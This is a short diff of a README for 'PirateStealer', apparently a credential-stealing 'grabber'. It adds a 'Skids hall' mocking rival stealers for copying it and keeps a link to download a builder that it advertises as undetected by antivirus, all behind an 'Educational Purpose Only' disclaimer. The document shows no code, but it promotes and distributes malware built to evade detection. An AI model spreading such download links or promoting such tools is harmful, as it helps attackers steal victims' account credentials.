@@ -1,4 +1,12 @@
-#### ⚠️ Proof Of Concept && Educational Purpose Only && KingFA, babastealer == Skid⚠️
+#### ⚠️ Proof Of Concept && Educational Purpose Only ⚠️
+## Skids hall 
+(changing embed colour and removing PirateStealer mention doesnt make your grabber selfcoded dumbass)
+- Baba Stealer
+- RapidFA
+- Zerian
+- DemonFA
+- KingFA
+- and others lol
 # PirateStealer 
 # Click here [Builder](https://github.com/bytixo/PirateStealer/releases/download/1.4.5/PirateStealerBuilder.zip) (Undected as of now)
 
